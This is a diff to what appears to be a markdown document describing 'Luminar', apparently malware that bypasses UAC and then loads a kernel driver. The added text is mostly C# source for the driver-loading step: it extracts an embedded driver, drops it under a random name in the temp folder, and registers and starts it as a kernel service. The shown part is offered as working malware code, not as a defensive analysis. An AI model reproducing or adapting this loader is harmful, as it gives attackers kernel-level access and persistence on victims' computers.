@@ -103,3 +103,44 @@ private static bool BypassUAC()
 ## Kernel Driver Loading
 
 Once administrator privileges are obtained, Luminar proceeds to load its kernel-mode driver.
+
+### Driver Loading Process
+
+```csharp
+private static bool LoadKernelDriver()
+{
+    // Extract driver from resources
+    byte[] driverData = ExtractDriverResource();
+    
+    // Write driver to a temporary location
+    string driverPath = Path.Combine(Path.GetTempPath(), GenerateRandomName() + ".sys");
+    File.WriteAllBytes(driverPath, driverData);
+    
+    // Load driver via Service Control Manager
+    IntPtr scmHandle = OpenSCManager(null, null, SC_MANAGER_ALL_ACCESS);
+    
+    if (scmHandle == IntPtr.Zero)
+        return false;
+    
+    // Create and start service for the driver
+    IntPtr serviceHandle = CreateService(scmHandle, "LuminarDriver", "Luminar System Service", 
+                                        SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, 
+                                        SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL, 
+                                        driverPath, null, IntPtr.Zero, null, null, null);
+    
+    if (serviceHandle == IntPtr.Zero)
+    {
+        // If service already exists, open it
+        serviceHandle = OpenService(scmHandle, "LuminarDriver", SERVICE_ALL_ACCESS);
+    }
+    
+    // Start the service
+    bool result = StartService(serviceHandle, 0, null);
+    
+    // Cleanup
+    CloseServiceHandle(serviceHandle);
+    CloseServiceHandle(scmHandle);
+    
+    return result;
+}
+```
